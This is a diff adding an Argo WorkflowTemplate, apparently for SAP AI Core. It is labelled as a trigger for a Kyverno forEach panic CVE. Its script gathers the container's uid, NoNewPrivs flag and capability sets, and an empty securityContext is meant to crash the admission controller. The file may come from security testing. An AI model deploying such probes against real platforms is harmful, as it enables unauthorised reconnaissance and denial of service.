@@ -1,0 +1,48 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: cve-41485-panic-test
+  labels:
+    scenarios.ai.sap.com/id: "kyverno-panic-test"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "kyverno-panic-test"
+    executables.ai.sap.com/name: "cve-41485-panic-test"
+    executables.ai.sap.com/description: "CVE-2026-41485 Kyverno forEach panic trigger"
+spec:
+  entrypoint: test
+  templates:
+  - name: test
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'PYEOF'
+        import os
+        def r(k, v): print(f"[KYVERNO_PANIC] {k}: {str(v)[:2000]}", flush=True)
+        r("PHASE", "1-RECON")
+        r("UID", f"uid={os.getuid()} euid={os.geteuid()}")
+        status = open("/proc/self/status").read()
+        nnp_line = [l for l in status.split("\n") if "NoNewPrivs" in l]
+        if nnp_line:
+            nnp_val = int(nnp_line[0].split(":")[1])
+            r("NoNewPrivs", str(nnp_val))
+        cap_lines = [l for l in status.split("\n") if l.startswith("Cap")]
+        for line in cap_lines:
+            k = line.split(":")[0].strip()
+            v = line.split(":")[1].strip() if ":" in line else ""
+            r(k, v)
+        r("DONE", "probe complete")
+        PYEOF
+      ports:
+      - containerPort: 8080
+        protocol: TCP
+      # This empty securityContext might trigger forEach mutations trying to patch nested fields
+      securityContext: {}
+      livenessProbe:
+        httpGet:
+          path: /
+          port: 8080
+        initialDelaySeconds: 60
+        periodSeconds: 10
